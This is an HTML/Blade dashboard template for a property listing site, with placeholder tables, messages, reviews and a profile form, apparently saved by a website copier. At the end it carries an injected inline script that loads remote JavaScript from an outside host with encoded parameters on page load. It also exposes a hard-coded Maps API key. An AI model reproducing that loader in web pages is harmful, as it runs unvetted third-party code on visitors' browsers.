<!DOCTYPE html>
<html lang="en" id="home">
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Prima Properti</title>

    <!-- Bootstrap -->
    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">
     
    <!-- External Css -->
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />

    <!-- leaflet -->
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="{{asset('assets/img/icon.png')}}">
  </head>
  <body>

  @include('layouts.nav')
    
    <!-- Dashboard -->
    <div class="cp-container section-padding">
      <div class="container-fluid">
        <div class="row">
          <div class="col-md-3">
            @include('layouts.sidebar')
          </div>
          <div class="col-md-9">
            <div class="dashboard-body-block">
              <div class="dashboard-section-container dashboard-statistic">
                <h4 class="title">Dashboard</h4>
                <div class="section-body">
                  <div class="row margin-balance">
                    <div class="col-sm-4">
                      <div class="statistic listing-statistic">
                        <div class="statistic-icon">
                          <span class="ti-location-pin"></span>
                        </div>
                        <div class="statistic-info">
                          <h6 class="number">85324</h6>
                          <p class="statistic-type">Listing</p>
                        </div>
                      </div>
                    </div>
                    <div class="col-sm-4">
                      <div class="statistic review-statistic">
                        <div class="statistic-icon">
                          <span class="ti-thumb-up"></span>
                        </div>
                        <div class="statistic-info">
                          <h6 class="number">324</h6>
                          <p class="statistic-type">Review</p>
                        </div>
                      </div>
                    </div>
                    <div class="col-sm-4">
                      <div class="statistic message-statistic">
                        <div class="statistic-icon">
                          <span class="ti-comments"></span>
                        </div>
                        <div class="statistic-info">
                          <h6 class="number">1324</h6>
                          <p class="statistic-type">Messages</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="dashboard-section-container listing-table-container">
                <h4 class="title">Listing</h4>
                <div class="section-body listing-table">
                  <div class="table-responsive">
                    <table class="table table-striped">
                      <thead>
                        <tr>
                          <th>Listing Name</th>
                          <th>Date</th>
                          <th>Rating</th>
                          <th>Status</th>
                          <th>Edit</th>
                        </tr>
                      </thead>
                      <tbody>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>25 Dec 2017</td>
                          <td class="rating"><span>4.3</span></td>
                          <td class="status"><span class=" active">Active</span></td>
                          <td class="edit"><a href="#"><span class="ti-pencil-alt"></span></a></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>25 Dec 2017</td>
                          <td class="rating"><span>4.3</span></td>
                          <td class="status"><span class="active">Active</span></td>
                          <td class="edit"><a href="#"><span class="ti-pencil-alt"></span></a></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>25 Dec 2017</td>
                          <td class="rating"><span>4.3</span></td>
                          <td class="status"><span class="non-active">Non-Active</span></td>
                          <td class="edit"><a href="#"><span class="ti-pencil-alt"></span></a></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>25 Dec 2017</td>
                          <td class="rating"><span>4.3</span></td>
                          <td class="status"><span class="active">Active</span></td>
                          <td class="edit"><a href="#"><span class="ti-pencil-alt"></span></a></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              <div class="dashboard-section-container payment-table-container">
                <h4 class="title">Payment &amp; analytics</h4>
                <div class="section-body">
                  <div class="table-responsive">
                    <table class="table table-striped">
                      <thead>
                        <tr>
                          <th>Listing Name</th>
                          <th>Views(week)</th>
                          <th>Payment</th>
                          <th>Listing Type</th>
                          <th>Make Payment</th>
                        </tr>
                      </thead>
                      <tbody>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>5245</td>
                          <td class="done"><span>Done</span></td>
                          <td class="premium"><span>Premium</span></td>
                          <td class="payment"><span><a href="#">Payment</a></span></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>5245</td>
                          <td class="done"><span>Done</span></td>
                          <td class="premium"><span>Premium</span></td>
                          <td class="payment"><span><a href="#">Payment</a></span></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>5245</td>
                          <td class="no"><span>No</span></td>
                          <td class="free"><span>Free</span></td>
                          <td class="payment"><span><a href="#">Payment</a></span></td>
                        </tr>
                        <tr>
                          <td>Red Blue Restaurant</td>
                          <td>5245</td>
                          <td class="done"><span>Done</span></td>
                          <td class="premium"><span>Premium</span></td>
                          <td class="payment"><span><a href="#">Payment</a></span></td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              <div class="dashboard-section-container message-container">
                <h4 class="title">Message</h4>
                <div class="section-body">
                  <div class="messages">
                    <div class="message">
                      <div class="thumb">
                        <img src="{{asset('images/dashboard/visitor/thumb-1.jpg')}}" class="img-responsive" alt="">
                      </div>
                      <div class="body">
                        <h6>Charli Maria <span class="badge">Unread</span></h6>
                        <p class="post-time">19 Minutes ago</p>
                        <p class="content">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p>
                        <div class="controller">
                          <ul>
                            <li><a href="#"><i class="fas fa-eye"></i></a></li>
                            <li><a href="#"><i class="fas fa-trash"></i></a></li>
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div class="message">
                      <div class="thumb">
                        <img src="{{asset('images/dashboard/visitor/thumb-2.jpg')}}" class="img-responsive" alt="">
                      </div>
                      <div class="body">
                        <h6>Charli Maria</h6>
                        <p class="post-time">19 Minutes ago</p>
                        <p class="content">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p>
                        <div class="controller">
                          <ul>
                            <li><a href="#"><i class="fas fa-eye"></i></a></li>
                            <li><a href="#"><i class="fas fa-trash"></i></a></li>
                          </ul>
                        </div>
                      </div>
                    </div>  
                  </div>
                </div>
              </div>
              <div class="dashboard-section-container review-container">
                <h4 class="title">Review</h4>
                <div class="section-body">
                  <div class="reviews">
                    <div class="review">
                      <div class="thumb">
                        <img src="{{asset('images/dashboard/visitor/thumb-1.jpg')}}" class="img-responsive" alt="">
                      </div>
                      <div class="body">
                        <h6>Charli Maria 
                          <span class="stars">
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                          </span>
                        </h6>
                        <p class="post-time">19 Minutes ago</p>
                        <p class="content">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p>
                        <div class="controller">
                          <ul>
                            <li><a href="#"><i class="fas fa-check"></i></a></li>
                            <li><a href="#"><i class="fas fa-edit"></i></a></li>
                            <li><a href="#"><i class="fas fa-reply"></i></a></li>
                            <li><a href="#"><i class="fas fa-trash"></i></a></li>
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div class="review">
                      <div class="thumb">
                        <img src="{{asset('images/dashboard/visitor/thumb-2.jpg')}}" class="img-responsive" alt="">
                      </div>
                      <div class="body">
                        <h6>Charli Maria
                          <span class="stars">
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                            <i class="fas fa-star"></i>
                          </span>
                        </h6>
                        <p class="post-time">19 Minutes ago</p>
                        <p class="content">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p>
                        <div class="controller">
                          <ul>
                            <li><a href="#"><i class="fas fa-check"></i></a></li>
                            <li><a href="#"><i class="fas fa-edit"></i></a></li>
                            <li><a href="#"><i class="fas fa-reply"></i></a></li>
                            <li><a href="#"><i class="fas fa-trash"></i></a></li>
                          </ul>
                        </div>
                      </div>
                    </div>  
                  </div>
                </div>
              </div>
              <div class="dashboard-section-container personal-info-container">
                <h4 class="title">Personal Information</h4>
                <div class="section-body">
                  <form action="#">
                    <div class="row">
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail1">First Name</label>
                          <input type="text" id="exampleInputEmail1" class="form-control" placeholder="Enter your First name">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmaild2">Last Name</label>
                          <input type="text" id="exampleInputEmaild2" class="form-control" placeholder="Enter your Last name">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail2">Email Address</label>
                          <input type="text" id="exampleInputEmail2" class="form-control" placeholder="Ex: example@domain.com">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail3">Phone Number</label>
                          <input type="text" id="exampleInputEmail3" class="form-control" placeholder="Ex: +1-0000-0000-00">
                        </div>
                      </div>
                      <div class="col-xs-12">
                        <div class="form-group">
                          <label for="exampleInputEmail4">Address</label>
                          <textarea name="address" id="exampleInputEmail4" class="form-control" placeholder="Write your address here"></textarea>
                        </div>
                      </div>
                      <div class="col-xs-12">
                        <div class="form-group">
                          <label for="exampleInputEmail5">About Yourself</label>
                          <textarea name="address" id="exampleInputEmail5" class="form-control" placeholder="Write about userself"></textarea>
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail6">Facebook</label>
                          <input type="text" id="exampleInputEmail6" class="form-control" placeholder="Paste your Facebook URL">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail7">Twitter</label>
                          <input type="text" id="exampleInputEmail7" class="form-control" placeholder="Paste your twitter URL">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail8">YouTube</label>
                          <input type="text" id="exampleInputEmail8" class="form-control" placeholder="Paste your YouTube URL">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="exampleInputEmail9">Linkedin</label>
                          <input type="text" id="exampleInputEmail9" class="form-control" placeholder="Paste your Linkedin URL">
                        </div>
                      </div>
                    </div>
                    <div class="password-section">
                      <h6>Update Password</h6>
                      <div class="row">
                        <div class="col-sm-6">
                          <div class="form-group">
                            <label for="exampleInputEmail10">New Password</label>
                            <input type="password" id="exampleInputEmail10" class="form-control" placeholder="Write new password">
                          </div>
                        </div>
                        <div class="col-sm-6">
                          <div class="form-group">
                            <label for="exampleInputEmail11">Repeat Password</label>
                            <input type="password" id="exampleInputEmail11" class="form-control" placeholder="Write same password again">
                          </div>
                        </div>
                      </div>
                    </div>
                    <button class="button create-profile-button primary-bg">Update Profile</button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Dashboard End -->

    <!-- Call to Action -->
    <div class="cpdv-container primary-bg section-padding-50">
      <div class="container">
        <div class="row">
          <div class="col-lg-7 col-md-6">
            <div class="left-content">
              <div class="call-to-action-content">
                <h3>Subscribe Today!</h3>
                <p>Don’t miss our future updates. Get Subscribe today to getting Updates!</p>
              </div>
            </div>
          </div>
          <div class="col-lg-5 col-md-6">
            <div class="right-content-sm">
              <div class="call-to-action-form">
                <form class="subscription-form" action="#" method="post">
                  <input type="text" placeholder="Enter your mail here">
                  <button class="button white-bg">Subscribe</button>
				  <p class="newsletter-success"></p>
				  <p class="newsletter-error"></p>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Call to Action End -->

    <!-- Footer -->
    <footer>
      <div class="footer-widget-area section-padding">
        <div class="container">
          <div class="row margin-balance">
            <div class="col-md-4 col-md-offset-1 col-sm-6">
              <aside class="widget footer-get-in-touch-widget">
                <h6 class="widget-title">Prima Properti</h6>
                <p><span class="title">Alamat</span><span class="contact-info">Jln. Letnan Sudiono Bondowoso</p>
                <p><span class="title">Telepon</span><span class="contact-info">0823-3512-7064</span></p>
                <p><span class="title">Email</span><span class="contact-info">support@primaproperti.com</span></p>
              </aside>
            </div>
            <div class="col-md-4 col-sm-6">
              <aside class="widget footer-listing-widget">
                <h6 class="widget-title">Properti Terbaru</h6>
                <div class="footer-listings">
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                </div>
              </aside>
            </div>
            <div class="col-md-2 col-sm-4">
              <aside class="widget widget-useful-link">
                <h6 class="widget-title">Informasi</h6>
                <ul class="links">
                  <li><a href="#">How to Purchase</a></li>
                  <li><a href="#">Tips &amp; Tricks</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                  <li><a href="#">Legal / Law</a></li>
                </ul>
              </aside>
            </div>
          </div>
        </div>
      </div>
      <div class="grey-bg section-padding-50">
        <div class="container">
          <div class="row">
            <div class="col-md-4 col-md-offset-4">
              <div class="footer-social-link">
                <div class="footer-logo">
                  <a href="#">
                    <img src="{{asset('assets/img/properti.png')}}" class="img-responsive" alt="Footer Logo" style="width: 100px; height: auto;">
                  </a>
                </div>
                <div class="social-link">
                  <ul>
                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                    <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="copyright primary-bg">
        <div class="container">
          <div class="row">
            <div class="col-md-6 col-md-push-6">
              <div class="footer-nav" id="footer-nav">
                <ul>
                  <li class="submenu">
                    <a href="#">Legal</a>
                    <ul class="submenu-item">
                      <li><a href="#">Dropdown 1</a></li>
                      <li><a href="#">Dropdown 2</a></li>
                      <li><a href="#">Dropdown 3</a></li>
                      <li class="submenu">
                        <a href="#">Dropdown 4</a>
                        <ul class="submenu-item">
                          <li><a href="#">Dropdown 1</a></li>
                          <li><a href="#">Dropdown 2</a></li>
                          <li><a href="#">Dropdown 3</a></li>
                          <li class="submenu">
                            <a href="#">Dropdown 4</a>
                            <ul class="submenu-item">
                              <li><a href="#">Dropdown 1</a></li>
                              <li><a href="#">Dropdown 2</a></li>
                              <li><a href="#">Dropdown 3</a></li>
                              <li class="submenu">
                                <a href="#">Dropdown 4</a>
                                <ul class="submenu-item">
                                  <li><a href="#">Dropdown 1</a></li>
                                  <li><a href="#">Dropdown 2</a></li>
                                  <li><a href="#">Dropdown 3</a></li>
                                  <li class="submenu">
                                    <a href="#">Dropdown 4</a>
                                    <ul class="submenu-item">
                                      <li><a href="#">Dropdown 1</a></li>
                                      <li><a href="#">Dropdown 2</a></li>
                                      <li><a href="#">Dropdown 3</a></li>
                                    </ul>
                                  </li>
                                </ul>
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li><a href="#">Terms &amp; Conditions </a></li>
                  <li><a href="#">Legal</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                </ul>
              </div>
            </div>
            <div class="col-md-6 col-md-pull-6">
              <p class="copyright-text">Copyright 2019, <a href="#">Prima Properti. </a> All Rights Reserved</p>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- Footer End -->

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/visible.js')}}"></script>
    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
    <script src="{{asset('assets/js/plyr.js')}}"></script>
    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>

    <!-- leaflet -->
    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>

    <script src="{{asset('js/custom.js')}}"></script>
    <script src="{{asset('js/dashboard.js')}}"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
    <script src="{{asset('js/map.js')}}"></script>
    <script src="{{asset('js/searchMap.js')}}"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJJk2kPrx8ZE1jypgkzAVZNTTaxWy%2fHWn%2bQxRbsqabhGDrunjaHFKnLLG6Oj87EFYyJhVY8xtLiVdXcMozoEfGBUGiZ2sefQDQyvAZNNEutFQ3N%2fHIvHjCW9G6pWh%2bnGYthtgYjG2C7%2fydGX1EEDXQdvXVCsANod0tTFIBVaGUt0nhZiKy%2bWNqF94Yx2drfopPiMjNnyjfii1c47vetfvR6FQy6y8ayLGKZonpcUM8bsS8rsaqafrJ9wY38WC63uDL1KnnMnbElRahOchjvMRau9x6n2cwgbotnHvBhgFlUK6iWSkIJ2UOmSgYNCV8Pft8HWkqT6KjhOw7Kjz2KdhyvtcOyPsDNAHUz21gv6PL39B1yZRDhXLaPgV9H3N81E126DVINZ0VqYaID8FlQvCnWyrrYHtu%2b38IAbmfdAJK%2bDGGm2DYVyeH%2fenfEKHAncLEpJWOipUTOsT47fozHr5BEwDHCnNQ2AqJB0Kl%2fBozjaTukUsP8V00D" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:16:01 GMT -->
</html>
